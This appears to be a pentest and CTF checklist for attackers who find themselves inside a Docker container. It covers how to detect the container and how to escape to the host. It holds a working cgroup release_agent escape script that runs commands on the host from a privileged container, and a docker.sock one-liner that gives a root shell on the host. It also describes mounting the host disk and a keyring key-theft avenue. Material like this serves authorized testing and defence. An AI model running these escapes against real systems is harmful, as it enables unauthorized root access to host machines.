# Attackers - Compromised Container Checklist

A list of things you can try if you're doing a CTF/Pentest/Bug bounty and find yourself in a container.

## Confirming you're in a container.

### Docker

- `ls -al /.dockerenv` - If this file exists, it's a strong indication you're in a container
- `ps -ef` - Not a definitive tell, but if there are no hardware management processes, it's a fair bet you're in a container
- `ip addr` - Again not definitive, but `172.17.0.0/16` is the default docker network, so if all you have is network stats, this is useful
- `ping host.docker.internal` - should respond if you're in a docker container

### Tools for checking

- Run [amicontained](https://github.com/genuinetools/amicontained)

## Breaking out

### High level areas

- File mounts. What information can you see from the host
- Granted Capabilities. Do you have extra rights
- Kernel version. Is it a really old kernel which has known exploits.

### Tooling

[tools list here](tools_list.md)

### Manual breakout - privileged containers

If you find out from amicontained or similar that you are in a privileged container, some ways to breakout

From [this tweet](https://twitter.com/_fel1x/status/1151487051986087936) this is a shell script which runs commands on the underlying host from a privileged container.

```bash
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```

save it as `escape.sh` and you can use it like

```bash
./escape.sh ps -ef
```

Another approach for privileged containers is just to mount the underlying root filesystem. Run the `mount` command to get a list of filesystems. Usually files like `/etc/resolv.conf` are mounted off the underlying node disk, so just find that disk and mount the entire thing under something like `/host` and it'll provide edit access to the node filesystem

### Manual breakout - Access to the Docker socket

If the tooling suggests that the Docker socket is available at `/var/run/docker.sock` then you can just get the docker CLI tool and run any docker command. To breakout use :-

* `docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host` - From [this](https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/) post. This will drop you into a root shell on the host.

## Other Avenues of attack

Avenues of attack that aren't directly related to breaking out of the container

### keyctl-unmask

As described in [this post](https://www.antitree.com/2020/07/keyctl-unmask-going-florida-on-the-state-of-containerizing-linux-keyrings/) it may be possible to get keys from the kernel keyring on a Docker host, and use those for breakouts or other access to the host or related machines.

